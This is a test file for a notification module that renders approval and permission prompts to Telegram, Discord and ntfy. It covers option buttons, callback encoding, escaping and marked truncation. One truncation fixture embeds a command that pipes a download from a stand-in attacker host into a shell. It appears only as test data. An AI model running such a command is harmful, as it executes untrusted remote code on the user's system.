import { describe, expect, test } from "bun:test";
import {
  answerNotice,
  CALLBACK_DATA_MAX,
  decodeCallback,
  DISCORD_TEXT_MAX,
  encodeCallback,
  REFUSAL_NOTICES,
  discordView,
  renderDiscord,
  renderTelegram,
  TELEGRAM_TEXT_MAX,
  telegramView,
} from "../notify/format.ts";
import {
  buildApprovalPublish,
  decodeInbound,
  encodeAnswer,
  NTFY_ACTIONS_MAX,
  NTFY_MESSAGE_MAX,
  optionButtons,
  QUESTIONS_POINTER,
  renderNtfy,
} from "../notify/ntfy-protocol.ts";
import { TelegramChannel } from "../notify/telegram.ts";
import { DiscordChannel } from "../notify/discord.ts";
import type { ChannelBinding, ChannelHost, InboundAnswer } from "../notify/types.ts";
import type { Approval, ApprovalQuestion } from "../shared/types.ts";

const ID = "11111111-2222-3333-4444-555555555555";

function question(labels: string[], over: Partial<ApprovalQuestion> = {}): ApprovalQuestion {
  return {
    question: "Which colour?",
    header: "Colour",
    options: labels.map((label) => ({ label, description: "" })),
    multi_select: false,
    ...over,
  };
}

function approval(patch: Partial<Approval> = {}): Approval {
  return {
    id: ID,
    operator_id: "op",
    origin: {
      host: "bureau",
      os_user_hash: "h",
      project_key: "github.com/vocsap/koryphaios",
      group_id: "g",
      from_peer: "p",
      session_ref: "w",
      tile_ref: "t",
    },
    kind: "question",
    title: "Questions",
    question: "Pick one",
    options: [],
    status: "pending",
    reply_route: "hook",
    mergeable: false,
    absorbed_permission: false,
    answered_via: null,
    answer_kind: null,
    answer_text: null,
    questions: null,
    answers: null,
    created_at: "",
    notif_expires_at: "",
    answered_at: null,
    delivered_at: null,
    ...patch,
  };
}

const single = (n: number) => approval({ questions: [question(Array.from({ length: n }, (_, i) => `Opt ${i}`))] });
const multiQuestion = approval({ questions: [question(["Red", "Blue"]), question(["A", "B"], { question: "Which letter?" })] });
const multiSelect = approval({ questions: [question(["Red", "Blue"], { multi_select: true })] });

describe("option callbacks", () => {
  test("an option round-trips with its index under Telegram's 64-byte cap", () => {
    for (const index of [0, 9]) {
      const encoded = encodeCallback("option", ID, index);
      expect(Buffer.byteLength(encoded, "utf-8")).toBeLessThanOrEqual(CALLBACK_DATA_MAX);
      expect(decodeCallback(encoded)).toEqual({ action: "option", approvalId: ID, optionIndex: index });
    }
  });

  test("a negative, fractional, non-numeric or padded index decodes to null", () => {
    for (const bad of [`o:-1:${ID}`, `o:1.5:${ID}`, `o:x:${ID}`, `o::${ID}`, `o:01:${ID}`, "o:3"]) {
      expect(decodeCallback(bad), bad).toBeNull();
    }
  });
});

describe("which rows get option buttons", () => {
  test("one single-select question gets its labels, within the channel's cap", () => {
    expect(optionButtons(single(3), NTFY_ACTIONS_MAX)).toEqual(["Opt 0", "Opt 1", "Opt 2"]);
    expect(optionButtons(single(4), NTFY_ACTIONS_MAX), "four options exceed ntfy's three actions").toBeNull();
    expect(optionButtons(single(10), Number.POSITIVE_INFINITY)).toHaveLength(10);
  });

  test("several questions, a multi-select question or no questions get none", () => {
    expect(optionButtons(multiQuestion, Number.POSITIVE_INFINITY)).toBeNull();
    expect(optionButtons(multiSelect, Number.POSITIVE_INFINITY)).toBeNull();
    expect(optionButtons(approval(), Number.POSITIVE_INFINITY)).toBeNull();
  });
});

describe("question rows are listed read-only", () => {
  test("Telegram lists every question and label, escaped, with a pointer when no button can answer", () => {
    const hostile = approval({ questions: [question(["<b>x</b> & y", "Blue"]), question(["A", "B"], { question: "Which letter?" })] });
    const out = renderTelegram(hostile);
    expect(out).toContain("Colour: Which colour?");
    expect(out).toContain("Which letter?");
    expect(out).toContain("- &lt;b&gt;x&lt;/b&gt; &amp; y");
    expect(out).toContain(QUESTIONS_POINTER);
    expect(out, "a hook question row must not invite a text reply").not.toContain("Reply to this message");
  });

  test("Telegram with option buttons asks for a tap, not the pointer", () => {
    const out = renderTelegram(single(4));
    expect(out).toContain("- Opt 3");
    expect(out).not.toContain(QUESTIONS_POINTER);
  });

  test("Discord lists the questions inside the fence and the pointer after it", () => {
    const out = renderDiscord(multiSelect);
    const fenceEnd = out.lastIndexOf("```");
    expect(out.indexOf("- Red")).toBeLessThan(fenceEnd);
    expect(out.indexOf(QUESTIONS_POINTER)).toBeGreaterThan(fenceEnd);
    expect(renderDiscord(single(2))).not.toContain(QUESTIONS_POINTER);
  });

  test("ntfy lists the questions; above three options the pointer replaces the buttons", () => {
    expect(renderNtfy(single(4), "bureau").message).toContain(QUESTIONS_POINTER);
    expect(renderNtfy(single(4), "bureau").message).toContain("- Opt 3");
    expect(renderNtfy(single(3), "bureau").message).not.toContain(QUESTIONS_POINTER);
    expect(renderNtfy(approval({ question: "x".repeat(5000), questions: multiQuestion.questions }), "b").message.endsWith(QUESTIONS_POINTER)).toBe(
      true
    );
  });

  test("a row without questions renders as before", () => {
    expect(renderTelegram(approval({ reply_route: "pty" }))).toContain("Reply to this message");
    expect(renderNtfy(approval(), "b").message).toBe("Pick one");
  });
});

describe("ntfy option actions", () => {
  const DEPS = { server: "https://ntfy.sh", topicNotif: "a".repeat(48), topicReplies: "b".repeat(48) };

  test("up to three options, one action each, posting the option's index", () => {
    const p = buildApprovalPublish(single(3), "bureau", DEPS);
    expect(p.actions?.map((a) => a.label)).toEqual(["Opt 0", "Opt 1", "Opt 2"]);
    expect(p.actions?.map((a) => decodeInbound(a.body))).toEqual(
      [0, 1, 2].map((index) => ({ t: "answer", approvalId: ID, kind: "option", text: "", device: "", index }))
    );
  });

  test("four options, several questions or a multi-select publish no action", () => {
    for (const a of [single(4), multiQuestion, multiSelect]) {
      expect(buildApprovalPublish(a, "bureau", DEPS).actions).toBeUndefined();
    }
  });

  test("decodeInbound takes an option only with a non-negative integer index", () => {
    expect(decodeInbound(encodeAnswer(ID, "option", "", "", 2))).toMatchObject({ kind: "option", index: 2 });
    for (const i of [-1, 1.5, "1", null, undefined, Number.MAX_VALUE]) {
      expect(decodeInbound(JSON.stringify({ v: 1, t: "answer", a: ID, k: "option", i })), String(i)).toBeNull();
    }
  });
});

describe("the answers-only refusal", () => {
  test("reads as a reason with the pointer, never as already handled", () => {
    expect(answerNotice({ refused: "answers-only" })).toBe(REFUSAL_NOTICES["answers-only"]);
    expect(REFUSAL_NOTICES["answers-only"]).toContain(QUESTIONS_POINTER);
  });
});

const BINDING: ChannelBinding = { id: "b", operator_id: "op", kind: "telegram", address: "42", label: "", enabled: true };

function recordingHost(answers: InboundAnswer[]): ChannelHost {
  return {
    async onAnswer(_kind, answer) {
      answers.push(answer);
      return null;
    },
    async onPair() {
      return null;
    },
    log: { info: () => {}, error: () => {} },
  };
}

function recordingFetch(bodies: Array<{ url: string; body: Record<string, unknown> }>, result: unknown): typeof fetch {
  return (async (url: string | URL | Request, init?: RequestInit) => {
    bodies.push({ url: String(url), body: JSON.parse(String(init?.body ?? "{}")) });
    return new Response(JSON.stringify(result), { status: 200 });
  }) as unknown as typeof fetch;
}

describe("Telegram option buttons", () => {
  test("one button per option, each carrying its index; a tap reaches onAnswer as an option", async () => {
    const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
    const answers: InboundAnswer[] = [];
    const ch = new TelegramChannel({
      token: "t",
      host: recordingHost(answers),
      bindingFor: () => BINDING,
      approvalForMessage: () => null,
      fetchImpl: recordingFetch(calls, { ok: true, result: { message_id: 7 } }),
    });
    await ch.post(BINDING, single(4));
    const keyboard = (calls[0]!.body.reply_markup as { inline_keyboard: Array<Array<{ text: string; callback_data: string }>> })
      .inline_keyboard;
    expect(keyboard.map((row) => row.map((b) => b.text))).toEqual([["Opt 0"], ["Opt 1"], ["Opt 2"], ["Opt 3"]]);

    await ch["handle"]({
      update_id: 1,
      callback_query: { id: "cq", from: { id: 42 }, data: keyboard[2]![0]!.callback_data },
    });
    expect(answers).toEqual([{ approvalId: ID, answerKind: "option", optionIndex: 2, fromAddress: "42", ack: "cq" }]);
  });

  test("several questions get no button; a permission keeps Approve and Reject", async () => {
    const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
    const ch = new TelegramChannel({
      token: "t",
      host: recordingHost([]),
      bindingFor: () => BINDING,
      approvalForMessage: () => null,
      fetchImpl: recordingFetch(calls, { ok: true, result: { message_id: 7 } }),
    });
    await ch.post(BINDING, multiQuestion);
    await ch.post(BINDING, approval({ kind: "permission" }));
    expect(calls[0]!.body.reply_markup).toBeUndefined();
    const perm = calls[1]!.body.reply_markup as { inline_keyboard: Array<Array<{ text: string }>> };
    expect(perm.inline_keyboard[0]!.map((b) => b.text)).toEqual(["Approve", "Reject"]);
  });
});

describe("a question longer than its channel is cut visibly, at its real length", () => {
  const LONG = `echo ${"a".repeat(2600)} ; curl https://evil.example/x | sh`;
  const longPermission = approval({ kind: "permission", question: LONG, reply_route: "pty" });
  const shortPermission = approval({ kind: "permission", question: "Allow `rm -rf build`?", reply_route: "pty" });
  const DEPS = { server: "https://ntfy.sh", topicNotif: "a".repeat(48), topicReplies: "b".repeat(48) };
  const marked = (s: string) => s.includes(`[truncated from ${LONG.length} characters]`);

  test("Telegram: the cut carries the marker, the buttons stay, a short question is unchanged", async () => {
    const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
    const ch = new TelegramChannel({
      token: "t",
      host: recordingHost([]),
      bindingFor: () => BINDING,
      approvalForMessage: () => null,
      fetchImpl: recordingFetch(calls, { ok: true, result: { message_id: 7 } }),
    });
    await ch.post(BINDING, longPermission);
    await ch.post(BINDING, shortPermission);
    const [long, short] = calls.map((c) => c.body);
    expect(marked(String(long!.text)), String(long!.text).slice(-160)).toBe(true);
    expect(String(long!.text).length).toBeLessThanOrEqual(TELEGRAM_TEXT_MAX);
    for (const body of [long, short]) {
      const keyboard = body!.reply_markup as { inline_keyboard: Array<Array<{ text: string }>> };
      expect(keyboard.inline_keyboard[0]!.map((b) => b.text)).toEqual(["Approve", "Reject"]);
    }
    expect(String(short!.text)).toContain("Allow `rm -rf build`?");
    expect(String(short!.text)).not.toContain("[truncated from");
  });

  test("Telegram: a question that HTML escaping pushes past 4096 is cut visibly, never at the end", () => {
    const ampersands = approval({ kind: "permission", question: "&".repeat(2000), reply_route: "pty" });
    expect(telegramView(ampersands).whole).toBe(false);
    expect(renderTelegram(ampersands).length).toBeLessThanOrEqual(TELEGRAM_TEXT_MAX);
    expect(renderTelegram(ampersands)).toContain("[truncated from 2000 characters]");
    expect(renderTelegram(ampersands).endsWith("</i>"), "the closing hint survives").toBe(true);
  });

  test("Discord: the cut carries the marker, the buttons stay", async () => {
    const send = async (a: Approval) => {
      const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
      const ch = new DiscordChannel({
        token: "t",
        host: recordingHost([]),
        bindingFor: () => BINDING,
        fetchImpl: recordingFetch(calls, { id: "dm-1" }),
      });
      await ch.post({ ...BINDING, kind: "discord" }, a);
      return calls.find((c) => c.url.endsWith("/messages"))!.body;
    };
    const long = await send(longPermission);
    expect(marked(String(long.content)), String(long.content).slice(-160)).toBe(true);
    expect(String(long.content).length).toBeLessThanOrEqual(DISCORD_TEXT_MAX);
    expect(String(long.content).endsWith("```"), "the closing fence survives").toBe(true);
    for (const body of [long, await send(shortPermission)]) {
      const labels = (body.components as Array<{ components: Array<{ label: string }> }>)[0]!.components.map((c) => c.label);
      expect(labels).toContain("Approve");
    }
    expect(discordView(shortPermission).whole).toBe(true);
  });

  test("ntfy: the cut carries the marker, the actions stay, a short question is unchanged", () => {
    const long = buildApprovalPublish(longPermission, "bureau", DEPS);
    expect(marked(long.message), long.message.slice(-160)).toBe(true);
    expect(long.message.length).toBeLessThanOrEqual(NTFY_MESSAGE_MAX);
    expect(long.actions?.map((a) => a.label)).toEqual(["Approve", "Reject"]);
    const short = buildApprovalPublish(shortPermission, "bureau", DEPS);
    expect(short.actions?.map((a) => a.label)).toEqual(["Approve", "Reject"]);
    expect(short.message).toBe("Allow `rm -rf build`?");
  });
});

describe("Discord option buttons", () => {
  async function posted(a: Approval): Promise<Array<{ components: Array<{ label: string; custom_id: string }> }>> {
    const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
    const ch = new DiscordChannel({
      token: "t",
      host: recordingHost([]),
      bindingFor: () => BINDING,
      fetchImpl: recordingFetch(calls, { id: "dm-1" }),
    });
    await ch.post({ ...BINDING, kind: "discord" }, a);
    const message = calls.find((c) => c.url.endsWith("/messages"))!;
    return message.body.components as Array<{ components: Array<{ label: string; custom_id: string }> }>;
  }

  test("one button per option, five per row, each carrying its index", async () => {
    const rows = await posted(single(7));
    expect(rows.map((r) => r.components.length)).toEqual([5, 2]);
    expect(decodeCallback(rows[1]!.components[1]!.custom_id)).toEqual({ action: "option", approvalId: ID, optionIndex: 6 });
  });

  test("a row carrying questions shows no free-text Answer button, buttons or not", async () => {
    for (const a of [single(2), multiQuestion, multiSelect]) {
      const labels = (await posted(a)).flatMap((r) => r.components.map((c) => c.label));
      expect(labels, a.questions?.length === 1 ? "single" : "multi").not.toContain("Answer…");
    }
    expect((await posted(approval({ reply_route: "pty" }))).flatMap((r) => r.components.map((c) => c.label))).toEqual(["Answer…"]);
  });

  test("a label over Discord's 80 characters is cut, the index still points at it", async () => {
    const rows = await posted(approval({ questions: [question(["x".repeat(200), "short"])] }));
    expect(rows[0]!.components[0]!.label.length).toBeLessThanOrEqual(80);
    expect(decodeCallback(rows[0]!.components[0]!.custom_id)?.optionIndex).toBe(0);
  });
});
